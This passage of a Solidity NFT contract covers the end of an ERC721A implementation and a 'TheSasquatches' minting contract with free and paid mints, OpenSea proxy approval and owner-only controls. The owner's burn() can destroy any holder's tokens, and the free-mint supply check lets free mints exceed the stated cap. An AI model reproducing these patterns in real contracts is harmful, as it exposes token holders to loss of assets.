1012     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
1013         uint256 curr = tokenId;
1014 
1015         unchecked {
1016             if (_startTokenId() <= curr && curr < _currentIndex) {
1017                 TokenOwnership memory ownership = _ownerships[curr];
1018                 if (!ownership.burned) {
1019                     if (ownership.addr != address(0)) {
1020                         return ownership;
1021                     }
1022                     // Invariant:
1023                     // There will always be an ownership that has an address and is not burned
1024                     // before an ownership that does not have an address and is not burned.
1025                     // Hence, curr will not underflow.
1026                     while (true) {
1027                         curr--;
1028                         ownership = _ownerships[curr];
1029                         if (ownership.addr != address(0)) {
1030                             return ownership;
1031                         }
1032                     }
1033                 }
1034             }
1035         }
1036         revert OwnerQueryForNonexistentToken();
1037     }
1038 
1039     /**
1040      * @dev See {IERC721-ownerOf}.
1041      */
1042     function ownerOf(uint256 tokenId) public view override returns (address) {
1043         return ownershipOf(tokenId).addr;
1044     }
1045 
1046     /**
1047      * @dev See {IERC721Metadata-name}.
1048      */
1049     function name() public view virtual override returns (string memory) {
1050         return _name;
1051     }
1052 
1053     /**
1054      * @dev See {IERC721Metadata-symbol}.
1055      */
1056     function symbol() public view virtual override returns (string memory) {
1057         return _symbol;
1058     }
1059 
1060     /**
1061      * @dev See {IERC721Metadata-tokenURI}.
1062      */
1063     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1064         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
1065 
1066         string memory baseURI = _baseURI();
1067         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
1068     }
1069 
1070     /**
1071      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1072      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1073      * by default, can be overriden in child contracts.
1074      */
1075     function _baseURI() internal view virtual returns (string memory) {
1076         return '';
1077     }
1078 
1079     /**
1080      * @dev See {IERC721-approve}.
1081      */
1082     function approve(address to, uint256 tokenId) public override {
1083         address owner = ERC721A.ownerOf(tokenId);
1084         if (to == owner) revert ApprovalToCurrentOwner();
1085 
1086         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
1087             revert ApprovalCallerNotOwnerNorApproved();
1088         }
1089 
1090         _approve(to, tokenId, owner);
1091     }
1092 
1093     /**
1094      * @dev See {IERC721-getApproved}.
1095      */
1096     function getApproved(uint256 tokenId) public view override returns (address) {
1097         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1098 
1099         return _tokenApprovals[tokenId];
1100     }
1101 
1102     /**
1103      * @dev See {IERC721-setApprovalForAll}.
1104      */
1105     function setApprovalForAll(address operator, bool approved) public override {
1106         if (operator == _msgSender()) revert ApproveToCaller();
1107 
1108         _operatorApprovals[_msgSender()][operator] = approved;
1109         emit ApprovalForAll(_msgSender(), operator, approved);
1110     }
1111 
1112     /**
1113      * @dev See {IERC721-isApprovedForAll}.
1114      */
1115     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1116         return _operatorApprovals[owner][operator];
1117     }
1118 
1119     /**
1120      * @dev See {IERC721-transferFrom}.
1121      */
1122     function transferFrom(
1123         address from,
1124         address to,
1125         uint256 tokenId
1126     ) public override onlyAllowedOperator(from) {
1127         _transfer(from, to, tokenId);
1128     }
1129 
1130     /**
1131      * @dev See {IERC721-safeTransferFrom}.
1132      */
1133     function safeTransferFrom(
1134         address from,
1135         address to,
1136         uint256 tokenId
1137     ) public override onlyAllowedOperator(from) {
1138         safeTransferFrom(from, to, tokenId, '');
1139     }
1140 
1141     /**
1142      * @dev See {IERC721-safeTransferFrom}.
1143      */
1144     function safeTransferFrom(
1145         address from,
1146         address to,
1147         uint256 tokenId,
1148         bytes memory _data
1149     ) public override onlyAllowedOperator(from) {
1150         _transfer(from, to, tokenId);
1151         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1152             revert TransferToNonERC721ReceiverImplementer();
1153         }
1154     }
1155 
1156     /**
1157      * @dev Returns whether `tokenId` exists.
1158      *
1159      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1160      *
1161      * Tokens start existing when they are minted (`_mint`),
1162      */
1163     function _exists(uint256 tokenId) internal view returns (bool) {
1164         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1165             !_ownerships[tokenId].burned;
1166     }
1167 
1168     function _safeMint(address to, uint256 quantity) internal {
1169         _safeMint(to, quantity, '');
1170     }
1171 
1172     /**
1173      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1174      *
1175      * Requirements:
1176      *
1177      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1178      * - `quantity` must be greater than 0.
1179      *
1180      * Emits a {Transfer} event.
1181      */
1182     function _safeMint(
1183         address to,
1184         uint256 quantity,
1185         bytes memory _data
1186     ) internal {
1187         _mint(to, quantity, _data, true);
1188     }
1189 
1190     /**
1191      * @dev Mints `quantity` tokens and transfers them to `to`.
1192      *
1193      * Requirements:
1194      *
1195      * - `to` cannot be the zero address.
1196      * - `quantity` must be greater than 0.
1197      *
1198      * Emits a {Transfer} event.
1199      */
1200     function _mint(
1201         address to,
1202         uint256 quantity,
1203         bytes memory _data,
1204         bool safe
1205     ) internal {
1206         uint256 startTokenId = _currentIndex;
1207         if (to == address(0)) revert MintToZeroAddress();
1208         if (quantity == 0) revert MintZeroQuantity();
1209 
1210         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1211 
1212         // Overflows are incredibly unrealistic.
1213         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1214         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1215         unchecked {
1216             _addressData[to].balance += uint64(quantity);
1217             _addressData[to].numberMinted += uint64(quantity);
1218 
1219             _ownerships[startTokenId].addr = to;
1220             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1221 
1222             uint256 updatedIndex = startTokenId;
1223             uint256 end = updatedIndex + quantity;
1224 
1225             if (safe && to.isContract()) {
1226                 do {
1227                     emit Transfer(address(0), to, updatedIndex);
1228                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1229                         revert TransferToNonERC721ReceiverImplementer();
1230                     }
1231                 } while (updatedIndex != end);
1232                 // Reentrancy protection
1233                 if (_currentIndex != startTokenId) revert();
1234             } else {
1235                 do {
1236                     emit Transfer(address(0), to, updatedIndex++);
1237                 } while (updatedIndex != end);
1238             }
1239             _currentIndex = updatedIndex;
1240         }
1241         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1242     }
1243 
1244     /**
1245      * @dev Transfers `tokenId` from `from` to `to`.
1246      *
1247      * Requirements:
1248      *
1249      * - `to` cannot be the zero address.
1250      * - `tokenId` token must be owned by `from`.
1251      *
1252      * Emits a {Transfer} event.
1253      */
1254     function _transfer(
1255         address from,
1256         address to,
1257         uint256 tokenId
1258     ) private {
1259         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1260 
1261         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1262             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1263             getApproved(tokenId) == _msgSender());
1264 
1265         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1266         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1267         if (to == address(0)) revert TransferToZeroAddress();
1268 
1269         _beforeTokenTransfers(from, to, tokenId, 1);
1270 
1271         // Clear approvals from the previous owner
1272         _approve(address(0), tokenId, prevOwnership.addr);
1273 
1274         // Underflow of the sender's balance is impossible because we check for
1275         // ownership above and the recipient's balance can't realistically overflow.
1276         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1277         unchecked {
1278             _addressData[from].balance -= 1;
1279             _addressData[to].balance += 1;
1280 
1281             _ownerships[tokenId].addr = to;
1282             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1283 
1284             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1285             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1286             uint256 nextTokenId = tokenId + 1;
1287             if (_ownerships[nextTokenId].addr == address(0)) {
1288                 // This will suffice for checking _exists(nextTokenId),
1289                 // as a burned slot cannot contain the zero address.
1290                 if (nextTokenId < _currentIndex) {
1291                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1292                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1293                 }
1294             }
1295         }
1296 
1297         emit Transfer(from, to, tokenId);
1298         _afterTokenTransfers(from, to, tokenId, 1);
1299     }
1300 
1301     /**
1302      * @dev Destroys `tokenId`.
1303      * The approval is cleared when the token is burned.
1304      *
1305      * Requirements:
1306      *
1307      * - `tokenId` must exist.
1308      *
1309      * Emits a {Transfer} event.
1310      */
1311     function _burn(uint256 tokenId) internal virtual {
1312         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1313 
1314         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1315 
1316         // Clear approvals from the previous owner
1317         _approve(address(0), tokenId, prevOwnership.addr);
1318 
1319         // Underflow of the sender's balance is impossible because we check for
1320         // ownership above and the recipient's balance can't realistically overflow.
1321         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1322         unchecked {
1323             _addressData[prevOwnership.addr].balance -= 1;
1324             _addressData[prevOwnership.addr].numberBurned += 1;
1325 
1326             // Keep track of who burned the token, and the timestamp of burning.
1327             _ownerships[tokenId].addr = prevOwnership.addr;
1328             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1329             _ownerships[tokenId].burned = true;
1330 
1331             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1332             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1333             uint256 nextTokenId = tokenId + 1;
1334             if (_ownerships[nextTokenId].addr == address(0)) {
1335                 // This will suffice for checking _exists(nextTokenId),
1336                 // as a burned slot cannot contain the zero address.
1337                 if (nextTokenId < _currentIndex) {
1338                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1339                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1340                 }
1341             }
1342         }
1343 
1344         emit Transfer(prevOwnership.addr, address(0), tokenId);
1345         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1346 
1347         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1348         unchecked {
1349             _burnCounter++;
1350         }
1351     }
1352 
1353     /**
1354      * @dev Approve `to` to operate on `tokenId`
1355      *
1356      * Emits a {Approval} event.
1357      */
1358     function _approve(
1359         address to,
1360         uint256 tokenId,
1361         address owner
1362     ) private {
1363         _tokenApprovals[tokenId] = to;
1364         emit Approval(owner, to, tokenId);
1365     }
1366 
1367     /**
1368      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1369      *
1370      * @param from address representing the previous owner of the given token ID
1371      * @param to target address that will receive the tokens
1372      * @param tokenId uint256 ID of the token to be transferred
1373      * @param _data bytes optional data to send along with the call
1374      * @return bool whether the call correctly returned the expected magic value
1375      */
1376     function _checkContractOnERC721Received(
1377         address from,
1378         address to,
1379         uint256 tokenId,
1380         bytes memory _data
1381     ) private returns (bool) {
1382         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1383             return retval == IERC721Receiver(to).onERC721Received.selector;
1384         } catch (bytes memory reason) {
1385             if (reason.length == 0) {
1386                 revert TransferToNonERC721ReceiverImplementer();
1387             } else {
1388                 assembly {
1389                     revert(add(32, reason), mload(reason))
1390                 }
1391             }
1392         }
1393     }
1394 
1395     /**
1396      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1397      * And also called before burning one token.
1398      *
1399      * startTokenId - the first token id to be transferred
1400      * quantity - the amount to be transferred
1401      *
1402      * Calling conditions:
1403      *
1404      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1405      * transferred to `to`.
1406      * - When `from` is zero, `tokenId` will be minted for `to`.
1407      * - When `to` is zero, `tokenId` will be burned by `from`.
1408      * - `from` and `to` are never both zero.
1409      */
1410     function _beforeTokenTransfers(
1411         address from,
1412         address to,
1413         uint256 startTokenId,
1414         uint256 quantity
1415     ) internal virtual {}
1416 
1417     /**
1418      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1419      * minting.
1420      * And also called after one token has been burned.
1421      *
1422      * startTokenId - the first token id to be transferred
1423      * quantity - the amount to be transferred
1424      *
1425      * Calling conditions:
1426      *
1427      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1428      * transferred to `to`.
1429      * - When `from` is zero, `tokenId` has been minted for `to`.
1430      * - When `to` is zero, `tokenId` has been burned by `from`.
1431      * - `from` and `to` are never both zero.
1432      */
1433     function _afterTokenTransfers(
1434         address from,
1435         address to,
1436         uint256 startTokenId,
1437         uint256 quantity
1438     ) internal virtual {}
1439 }
1440 
1441 
1442 
1443 contract TheSasquatches is ERC721A, Owneable {
1444 
1445     string public baseURI = "ipfs://QmU39VYmqnFAk3aNjMeJYtQX4cygyed65UJHsfQkw46nyD/";
1446     string public contractURI = "ipfs://";
1447     string public baseExtension = ".json";
1448     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1449 
1450     uint256 public MAX_PER_TX_FREE = 3;
1451     uint256 public free_max_supply = 333;
1452     uint256 public constant MAX_PER_TX = 10;
1453     uint256 public max_supply = 3333;
1454     uint256 public price = 0.001 ether;
1455 
1456 
1457 
1458     bool public paused = true;
1459 
1460     constructor() ERC721A("The Sasquatches", "SaS") {}
1461 
1462     function PublicMint(uint256 _amount) external payable {
1463 
1464         address _caller = _msgSender();
1465         require(!paused, "Paused");
1466         require(max_supply >= totalSupply() + _amount, "All Gone");
1467         require(_amount > 0, "No 0 mints");
1468         require(tx.origin == _caller, "No Contract minting.");
1469         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1470         
1471       if(free_max_supply >= totalSupply()){
1472             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1473         }else{
1474             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1475             require(_amount * price == msg.value, "Invalid funds provided");
1476         }
1477 
1478 
1479         _safeMint(_caller, _amount);
1480     }
1481 
1482 
1483 
1484     function isApprovedForAll(address owner, address operator)
1485         override
1486         public
1487         view
1488         returns (bool)
1489     {
1490         // Whitelist OpenSea proxy contract for easy trading.
1491         
1492         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1493         if (address(proxyRegistry.proxies(owner)) == operator) {
1494             return true;
1495         }
1496 
1497         return super.isApprovedForAll(owner, operator);
1498     }
1499 
1500     function Withdraw() external onlyOwner {
1501         uint256 balance = address(this).balance;
1502         (bool success, ) = _msgSender().call{value: balance}("");
1503         require(success, "Failed to send");
1504     }
1505 
1506     function Reserve(uint256 quantity) external onlyOwner {
1507         _safeMint(_msgSender(), quantity);
1508     }
1509 
1510 
1511     function pause(bool _state) external onlyOwner {
1512         paused = _state;
1513     }
1514 
1515     function setBaseURI(string memory baseURI_) external onlyOwner {
1516         baseURI = baseURI_;
1517     }
1518 
1519     function setContractURI(string memory _contractURI) external onlyOwner {
1520         contractURI = _contractURI;
1521     }
1522 
1523     function configPrice(uint256 newPrice) public onlyOwner {
1524         price = newPrice;
1525     }
1526 
1527 
1528      function configMAX_PER_TX_FREE(uint256 newFREE) public onlyOwner {
1529         MAX_PER_TX_FREE = newFREE;
1530     }
1531 
1532     function configmax_supply(uint256 newSupply) public onlyOwner {
1533         max_supply = newSupply;
1534     }
1535 
1536     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1537         free_max_supply = newFreesupply;
1538     }
1539     function newbaseExtension(string memory newex) public onlyOwner {
1540         baseExtension = newex;
1541     }
1542 
1543 
1544 
1545         function burn(uint256[] memory tokenids) external onlyOwner {
1546         uint256 len = tokenids.length;
1547         for (uint256 i; i < len; i++) {
1548             uint256 tokenid = tokenids[i];
1549             _burn(tokenid);
1550         }
1551     }
1552 
1553 
1554     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1555         require(_exists(_tokenId), "Token does not exist.");
1556         return bytes(baseURI).length > 0 ? string(
1557             abi.encodePacked(
1558               baseURI,
1559               Strings.toString(_tokenId),
1560               baseExtension
1561             )
1562         ) : "";
1563     }
1564 }
1565 
1566 contract OwnableDelegateProxy { }
1567 contract ProxyRegistry {
1568     mapping(address => OwnableDelegateProxy) public proxies;
1569 }